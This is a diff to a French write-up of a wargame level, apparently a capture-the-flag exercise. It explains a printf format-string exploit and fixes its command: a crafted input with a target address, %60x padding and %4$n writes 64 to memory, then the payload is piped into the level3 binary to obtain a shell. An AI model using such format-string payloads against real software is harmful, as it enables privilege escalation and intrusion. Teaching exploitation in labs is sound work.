@@ -40,13 +40,13 @@ Shellcode finale :
 - \x8c\x98\x04\x08 : 
 Ceci est l'adresse formatté 0x804988c, dont on veux changer la valeur.
 - %60x : 
-Correspond à la valeur 64 qu'on veut écrire à l'adresse 0x804988c. On enleve 4 car la taille de l'adresse compte déjà dans la valeur finale écrite à cette mëme adresse.
+Correspond à la valeur 64 qu'on veut écrire à l'adresse 0x804988c. On enleve 4 car la taille de l'adresse compte déjà dans la valeur finale écrite à cette meme adresse.
 - %4$n : 
 %n de printf permet d'écrire de la data à l'ènième adresse indiqué par '<valeur>$'
 
 Procédure finale :
 
     python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/inject
-    /tmp/inject - | ./level3
+    cat /tmp/inject - | ./level3
 
 On obtient le shell avec les permissions utilisateur du fichier. On peut maintenant aller sur le profil du level4.
